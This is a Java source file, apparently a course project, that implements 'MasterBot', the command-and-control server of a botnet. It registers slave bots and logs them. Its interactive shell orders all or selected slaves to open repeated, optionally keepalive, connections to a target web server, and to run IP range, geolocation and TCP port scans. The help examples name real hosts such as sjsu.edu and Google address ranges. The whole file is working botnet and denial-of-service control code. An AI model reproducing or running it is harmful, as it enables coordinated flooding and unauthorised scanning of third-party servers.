import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;

public class MasterBot extends Thread 
{
//--variable declarations----------------------------------------------------------------------------------------------------------------------
	private ServerSocket ms;
	static boolean keepAlive;
	static String slaveIPAddress, targetIPAddress, url;
	static int noOfSlavesConnected, targetPort, connectionCount, successfulConnects, successfulDisconnects;
	static HashMap<String, ArrayList<Socket>> slavetoRemote = new HashMap<String, ArrayList<Socket>>();
	static ArrayList<Socket> clientList = new ArrayList<>();
	static SlaveBot b = new SlaveBot();
	static boolean geolocation = false;
//--constructor--------------------------------------------------------------------------------------------------------------------------------
	public MasterBot()
	{
		
	}
//--constructor--------------------------------------------------------------------------------------------------------------------------------
	public MasterBot(int port) throws IOException 
	{
		ms = new ServerSocket(port);
	}

//--run() method for threads-------------------------------------------------------------------------------------------------------------------
	public void run()
	{
		noOfSlavesConnected = 0;
		BufferedWriter bw = null;
		String data = "";

		try 
		{	
			File file = new File("clientLog.txt");
			bw = new BufferedWriter(new FileWriter(file));
			Date date = new Date();
			data = "SlaveHostName" + "\t" + "IPAddress" + "\t\t" + "SourcePortNumber" + "\t" + "RegistrationDate";
			bw.write(data);

			while (true) 
			{
				Socket ss = new Socket();
				ss = ms.accept();
				clientList.add(ss);
				noOfSlavesConnected++;
				bw.newLine();
				
				data = "Slave" + noOfSlavesConnected + "\t";
				bw.write(data);
				
				data = "\t" + ss.getRemoteSocketAddress() + "\t";
				bw.write(data);

				data = ss.getPort() + "\t\t";
				bw.write(data);

				data = "\t" + new SimpleDateFormat("YYYY-MM-dd").format(date);
				bw.write(data);

				bw.flush();
			}

		} catch (IOException e) 
		{
			e.printStackTrace();
		}

		finally 
		{
			try 
			{
				ms.close();
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
	}
//--printIpScan--------------------------------------------------------------------------------------------------------------------------------
	void printIpScan (ArrayList<String> listOfResponsdedTarget) throws IOException
	{
		System.out.println("Output for IP Scan.....");
		if(listOfResponsdedTarget.size() == 0)
		{
			System.out.println("No servers responded to the ping request.");
		}
		else
		{
			for(int i = 0; i < listOfResponsdedTarget.size();i++)
			{
				System.out.println(listOfResponsdedTarget.get(i));
			}
			System.out.println("Total Number of Respondents : " + listOfResponsdedTarget.size());
			System.out.println(">");
			listOfResponsdedTarget.clear();
		}
	}
//--printtcpPoetScan---------------------------------------------------------------------------------------------------------------------------
	void printtcpPortScan (ArrayList<String> activePorts)
	{
		System.out.println("Output for TCP Port Scan.....");
		if(activePorts.size() == 0)
		{
			System.out.println("No servers responded to the ping request.");
		}
		else
		{
			System.out.println(activePorts);
		}
		System.out.println("Total Number of Active Ports : " + activePorts.size());
		System.out.print(">");
	}	
//--main---------------------------------------------------------------------------------------------------------------------------------------
	public static void main(String[] args) 
	{
		String commandLine;
		BufferedReader br1 = new BufferedReader(new InputStreamReader(System.in));
		int port = 0;
		//input format example = "java MasterBot -p 9999"
		if (args.length != 0) 
		{
			port = Integer.parseInt(args[1]);
		} 
		//input format example = "java MasterBot"
		else 
		{
			System.out.println("Using default port number 2317");
			port = 2317;
		}

		if (port != 0) 
		{
			try 
			{
				Thread t = new MasterBot(port);
				t.start();
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
//------command line implementation 
		System.out.println("> Welcome to shell. \n Type 'help' for more details.");
		while (true) 
		{
			try 
			{
				System.out.print(">");
				commandLine = br1.readLine();
//--------------loop if no data is entered
				if (commandLine.equals("")) 
				{
					System.out.println("> type help for more details \n");
					continue;
				}
//--------------help function logic
				else if (commandLine.equals("help"))
				{
					System.out.println("*********************Welcome to Shell Help*********************");
					System.out.println("List of available commands:");
					System.out.println("1) list");
					System.out.println("2) connect (Example	: connect all www.sjsu.edu 80 10(optional) keepalive(optional) url=/#q=(optional))");
					System.out.println("3) disconnect (Example	: disconnect all www.sjsu.edu 80 10(optional))");
					System.out.println("4) ipscan (Example	: ipscan all 64.233.160.0-64.233.191.255(ip address range of google))");
					System.out.println("5) tcpportscan (Example	: tcpportscan all www.google.com 6000-7000)");
					System.out.println("6) exit \n");
					continue;
				}
//--------------list function logic
				else if (commandLine.equals("list")) 
				{
					BufferedReader br2 = new BufferedReader(new FileReader("clientLog.txt"));
					String currentLine;
					while ((currentLine = br2.readLine()) != null) 
					{
						System.out.println(currentLine);
					}
					System.out.println("Total number of connected slaves : " + noOfSlavesConnected + "\n");
					continue;
				}
//--------------connect function logic
				else if (commandLine.startsWith("connect")) 
				{
					keepAlive = false;
					url = null;
					successfulConnects = 0;
					//if no slaves are connected

					if(noOfSlavesConnected == 0)
					{
						System.out.println("No Slaves are currently connected to the server.\n");
						continue;
					}
					
					String[] dataArray = commandLine.split("\\s+");
					//invalid format
					if(dataArray.length == 4 && dataArray[3].contains("keepalive"))
					{
						System.out.println("Invalid Format. Type 'help' for more details.\n");
						continue;
					}
					//invalid format
					else if(dataArray.length == 4 && dataArray[3].contains("url"))
					{
						System.out.println("Invalid Format. Type 'help' for more details.\n");
						continue;
					}
					//if number of connections is not defined (Example : connect all www.sjsu.edu 80)
					else if(dataArray.length == 4)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = 1;
					}
					//if only keepalive is requested (Example : connect all www.sjsu.edu 80 keepalive) 
					else if(dataArray.length == 5 && dataArray[4].contains("keepalive"))
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = 1;
						keepAlive = true;
					}
					//if only url is provided (Example : connect all www.sjsu.edu 80 url=) 
					else if(dataArray.length == 5 && dataArray[4].contains("url"))
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						url = dataArray[4].substring(4);
						connectionCount = 1;
					}
					//if  only connection count is provided (Example : connect all www.sjsu.edu 80 10 
					else if(dataArray.length == 5)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
					}
					//if keepalive is requested with connection count (Example : connect all www.sjsu.edu 80 10 keepalive) 
					else if(dataArray.length == 6 && dataArray[5].contains("keepalive"))
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
						keepAlive = true;
					}
					//if url is provided with connection count (Example : connect all www.sjsu.edu 80 10 url=) 
					else if(dataArray.length == 6 && dataArray[5].contains("url"))
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
						url = dataArray[5].substring(4);
					}
					//if everything is provided (Example : connect all www.sjsu.edu 80 10 keepalive url=)
					else if(dataArray.length == 7 && dataArray[5].contains("keepalive"))
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
						keepAlive = true;
						url = dataArray[6].substring(4);;
					}	
					//for invalid formats
					else if(dataArray.length < 4)
					{
						System.out.println("Invalid Format. Type 'help' for more details.\n");
						continue;
					}
					//if targetPort is invalid
					if(targetPort!=80)
					{
						if(targetPort!=443)
						{
							System.out.println("Available Target Ports : 80, 443. Type 'help' for more details.\n");
							continue;
						}
					}
					//for all slaves (Example : connect all www.sjsu.edu 80)
					if (slaveIPAddress.equalsIgnoreCase("all"))
					{
						for(int i=0; i<clientList.size(); i++)
						{
							for(int j=0; j<connectionCount; j++)
							{
								slavetoRemote = b.connect(clientList.get(i), targetIPAddress, targetPort, keepAlive, url);
								successfulConnects++;
							}
						}
					}
					//for specific slave (Example : connect 127.0.0.1:52317 www.sjsu.edu 80)
					else
					{
						String line;
						for(int i=0; i<clientList.size(); i++)
						{
							line = "/"+slaveIPAddress;

							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
							{
								for(int j=0; j<connectionCount; j++)
								{
									slavetoRemote = b.connect(clientList.get(i), targetIPAddress, targetPort, keepAlive, url);
									successfulConnects++;
								}
							}
						}
					}
					System.out.println(successfulConnects + " connections were established.\n");
					continue;
				}
//--------------disconnect function logic
				else if (commandLine.startsWith("disconnect"))
				{
					successfulDisconnects = 0;
					boolean connectionCountProvided = true;
					//if no slaves are connected
					if(noOfSlavesConnected == 0)
					{
						System.out.println("No Slaves are currently connected to the server.\n");
						continue;
					}
					//String array to capture arguments
					String[] dataArray = commandLine.split("\\s+");
					//if number of connections is not defined
					if(dataArray.length == 4)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCountProvided = false;
					}
					//if number of connections is defined
					else if(dataArray.length == 5)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
						connectionCountProvided = true;
					}
					//for invalid formats
					else if(dataArray.length < 4)
					{
						System.out.println("Invalid Format. Type 'help' for more details.\n");
						continue;
					}
					//if targetPort is invalid
					if(targetPort!=80)
					{
						if(targetPort!=443)
						{
							System.out.println("Available Target Ports : 80, 443. Type 'help' for more details.\n");
							continue;
						}
					}
					//for all slaves with no number of connections provided (Example : disconnect all www.sjsu.edu 80)
					if (slaveIPAddress.equalsIgnoreCase("all") && connectionCountProvided == false)
					{
						for(int i=0; i<clientList.size(); i++)
						{
							for(String key: slavetoRemote.keySet())
							{
								ArrayList<Socket> temp=slavetoRemote.get(key);
								if(temp.size()!=0)
								{
									for(int j=(temp.size()-1); j>=0; j--)
									{
										if(temp.get(j).getInetAddress().toString().contains(targetIPAddress))
										{
												b.disconnect(temp.get(j), targetIPAddress, targetPort);
												successfulDisconnects++;
												temp.remove(j);
										}
									}
								}
							}
						}
					}
					//for all slaves with number of connections provided (Example : disconnect all www.sjsu.edu 80 5)
					else if (slaveIPAddress.equalsIgnoreCase("all") && connectionCountProvided == true)
					{
						int currentConnectionCount = slavetoRemote.size() * connectionCount;
						for(int i=0; i<clientList.size(); i++)
						{
							for(String key: slavetoRemote.keySet())
							{
								ArrayList<Socket> temp=slavetoRemote.get(key);
								if(temp.size()!=0)
								{
									for(int j=(temp.size()-1); j>=0; j--)
									{
										if(temp.get(j).getInetAddress().toString().contains(targetIPAddress))
										{
												if(currentConnectionCount!=0)
												{
													b.disconnect(temp.get(j), targetIPAddress, targetPort);
													successfulDisconnects++;
													temp.remove(j);
													currentConnectionCount--;
												}
										}
									}
								}
							}
						}
					}
					//for selected slave with no number of connections provided (Example : disconnect 127.0.0.1:52317 www.sjsu.edu 80)
					else if (!slaveIPAddress.equalsIgnoreCase("all") && connectionCountProvided == false)
					{
						String line;
						for(int i=0; i<clientList.size(); i++)
						{
							line = "/"+slaveIPAddress;

							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
							{
								ArrayList<Socket> temp=slavetoRemote.get(line);
								if(temp.size()!=0)
								{
									for(int j=(temp.size()-1); j>=0; j--)
									{
										if(temp.get(j).getInetAddress().toString().contains(targetIPAddress))
										{
											b.disconnect(temp.get(j), targetIPAddress, targetPort);
											successfulDisconnects++;
											temp.remove(j);	
										}
									}
								}
							}
						}
					}
					//for selected slave with number of connections provided (Example : disconnect 127.0.0.1:52317 www.sjsu.edu 80 5)
					else if (!slaveIPAddress.equalsIgnoreCase("all") && connectionCountProvided == true)
					{
						String line;
						for(int i=0; i<clientList.size(); i++)
						{
							line = "/"+slaveIPAddress;

							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
							{
								ArrayList<Socket> temp=slavetoRemote.get(line);
								if(temp.size()!=0)
								{
									for(int j=(temp.size()-1); j>=0; j--)
									{
										if(temp.get(j).getInetAddress().toString().contains(targetIPAddress))
										{
											if(connectionCount!=0)
											{
												b.disconnect(temp.get(j), targetIPAddress, targetPort);
												successfulDisconnects++;
												temp.remove(j);
												connectionCount--;
											}
										}
									}
								}
							}
						}
					}
					System.out.println(successfulDisconnects + " connections were terminated.\n");
					continue;
				}
//--------------exit function logic
				else if (commandLine.equalsIgnoreCase("exit") || commandLine.equalsIgnoreCase("quit") || commandLine.equalsIgnoreCase("-1")) 
				{
					System.out.println("Shell Terminated.");
					System.exit(0);
				}
//--------------geoipscan function logic
				else if (commandLine.startsWith("geoipscan"))
				{
					//String array to capture arguments
					String[] dataArray = commandLine.split("\\s+");
					geolocation = true;
					String range = null;
					
					if(noOfSlavesConnected == 0)
					{
						System.out.println("No Slaves are currently connected to the server.\n");
						continue;
					}
					
					//if number of arguments are invalid
					if(dataArray.length != 3)
					{
						System.out.println("Invalid Format. Type 'help' for more details.\n");
						continue;
					}
					
					if(dataArray.length == 3)
					{
						slaveIPAddress = dataArray[1];
						range = dataArray[2];		
						System.out.println("geoipscan is running in background.");
					}
					//for all slaves (Example : ipscan all 64.233.162.127-64.233.162.152)
					if(slaveIPAddress.equalsIgnoreCase("all"))
					{
						for(int i=0; i<clientList.size(); i++)
						{
							b.ipScan(clientList.get(i), range, geolocation);
						}	
					}
					//for specific slaves (Example : ipscan 127.0.0.1:52317 64.233.162.127-64.233.162.152)
					if(!slaveIPAddress.equalsIgnoreCase("all"))
					{
						String line;
						for(int i=0; i<clientList.size(); i++)
						{
							line = "/"+slaveIPAddress;
							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
							{
								b.ipScan(clientList.get(i), range, geolocation);
							}
							else
							{
								System.out.println("No such slave is connected to the Master.");
							}
						}
					}
					continue;
				}
//--------------ipscan function logic
				else if (commandLine.startsWith("ipscan"))
				{
					//String array to capture arguments
					String[] dataArray = commandLine.split("\\s+");
					
					String range = null;
					
					if(noOfSlavesConnected == 0)
					{
						System.out.println("No Slaves are currently connected to the server.\n");
						continue;
					}
					
					//if number of arguments are invalid
					if(dataArray.length != 3)
					{
						System.out.println("Invalid Format. Type 'help' for more details.\n");
						continue;
					}
					
					if(dataArray.length == 3)
					{
						slaveIPAddress = dataArray[1];
						range = dataArray[2];		
						System.out.println("ipscan is running in background.");
					}
					//for all slaves (Example : ipscan all 64.233.162.127-64.233.162.152)
					if(slaveIPAddress.equalsIgnoreCase("all"))
					{
						for(int i=0; i<clientList.size(); i++)
						{
							b.ipScan(clientList.get(i), range, geolocation);
						}	
					}
					//for specific slaves (Example : ipscan 127.0.0.1:52317 64.233.162.127-64.233.162.152)
					if(!slaveIPAddress.equalsIgnoreCase("all"))
					{
						String line;
						for(int i=0; i<clientList.size(); i++)
						{
							line = "/"+slaveIPAddress;
							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
							{
								b.ipScan(clientList.get(i), range, geolocation);
							}
							else
							{
								System.out.println("No such slave is connected to the Master.");
							}
						}
					}
					continue;
				}
//--------------tcpportscan function logic
				else if (commandLine.startsWith("tcpportscan"))
				{
					//String array to capture arguments
					String[] dataArray = commandLine.split("\\s+");
					String portRange = null;
					
					if(noOfSlavesConnected == 0)
					{
						System.out.println("No Slaves are currently connected to the server.\n");
						continue;
					}
					//for invalid commands
					if(dataArray.length != 4)
					{
						System.out.println("Invalid Format. Type 'help' for more details.\n");
						continue;
					}
					//for valid commands
					if(dataArray.length == 4)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						portRange = dataArray[3];
						System.out.println("tcpportscan is running in background.");
					}
					//for all slaves (Example : tcpportscan all www.google.com 8000-9000)
					if(slaveIPAddress.equalsIgnoreCase("all"))
					{
						for(int i=0; i<clientList.size(); i++)
						{
							b.tcpPortScan(clientList.get(i), portRange, targetIPAddress);
						}	
					}
					//for specific slaves (Example : tcpportscan 127.0.0.1:52317 www.google.com 8000-9000)
					if(!slaveIPAddress.equalsIgnoreCase("all"))
					{
						String line;
						for(int i=0; i<clientList.size(); i++)
						{
							line = "/"+slaveIPAddress;
							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
							{
								b.tcpPortScan(clientList.get(i), portRange, targetIPAddress);
							}
							else
							{
								System.out.println("No such slave is connected to the Master.");
							}
						}
					}
					continue;
				}
//--------------for anything else
				else
				{
					System.out.println("> type help for more details \n");
					continue;
				}
				
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
	}
}